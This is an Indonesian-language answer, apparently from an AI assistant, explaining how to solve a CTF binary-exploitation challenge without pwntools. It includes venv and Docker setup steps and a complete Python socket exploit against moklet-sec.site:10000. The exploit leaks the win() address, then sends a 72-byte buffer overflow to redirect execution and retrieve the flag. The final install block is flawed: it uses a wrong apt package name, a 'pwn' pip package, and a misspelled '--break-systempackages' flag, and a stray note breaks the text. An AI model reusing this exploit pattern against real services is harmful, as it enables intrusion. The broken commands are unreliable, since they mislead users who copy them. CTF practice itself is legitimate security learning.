Kalau kamu belum bisa install `pwntools` karena keterbatasan lingkungan, ada beberapa solusi tergantung sistem dan kondisimu. Aku jelaskan beberapa cara:

---

## 🛠️ 1. **Coba pakai Python Virtual Environment**

Kalau sistemmu tidak punya `pwntools` tapi bisa install Python packages, coba:

```bash
sudo apt update
sudo apt install python3 python3-pip python3-venv -y

# Buat virtual environment
python3 -m venv pwnenv  # atau bisa dengan `python3 -m venv venv`
source pwnenv/bin/activate  # atau `source venv/bin/activate`

# Install pwntools
pip install --upgrade pip
pip install pwntools
```

> Kalau berhasil, jalankan semua script eksploitasi dalam venv ini: `source pwnenv/bin/activate`

(below this are unnecessary)
---

## 🧪 2. **Coba di Docker (lebih bersih dan portable)**

Kalau bisa pakai Docker:

```bash
sudo apt install docker.io -y
sudo docker run -it --rm --name pwnbox -v $(pwd):/ctf --workdir /ctf python:3.10 bash

# Di dalam container:
pip install pwntools
```

> Semua script bisa kamu taruh di folder lokal (`$(pwd)`), dan akan muncul di `/ctf` dalam container.

---

## 🔧 3. **Coba manual tanpa pwntools (pakai Python + `socket`)**

Kalau benar-benar tidak bisa install apa pun, kamu masih bisa eksploitasi pakai script Python dasar:

```python
import socket
import time
import struct

def p64(val):
    return struct.pack("<Q", val)  # little-endian 64-bit

s = socket.create_connection(("moklet-sec.site", 10000))

def recv_until(prompt):
    data = b""
    while not data.endswith(prompt):
        data += s.recv(1)
    return data

# Step 1: kirim 'leboy' dan ambil alamat win()
recv_until(b"ask yobel : ")
s.send(b"leboy\n")
leak_line = s.recv(1024).decode()
print("[+] Leak line:", leak_line)
win_addr = int(leak_line.strip(), 16)
print("[+] Win address:", hex(win_addr))

# Step 2: quit dan konfirmasi
recv_until(b"ask yobel : ")
s.send(b"quit\n")
recv_until(b"are you sure Y/N?")
s.send(b"Y\n")

# Step 3: exploit dengan payload overflow
recv_until(b"kata kata sebelum solve bang : ")
payload = b"A" * 72 + p64(win_addr)
s.send(payload + b"\n")

# Step 4: baca output (semoga flag!)
while True:
    try:
        print(s.recv(4096).decode(), end="")
    except:
        break

s.close()
```

> Script ini adalah versi **tanpa pwntools**, pakai `socket` dan `struct` biasa. Tetap bisa jalan asal tahu offset overflow-nya.

---

Jika berhasil, instal dengan menyalin command-command ini:
```bash
sudo apt install gdb pip
pip install pwn pwntools pwndbg --break-systempackages
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
ls
./setup.sh
```
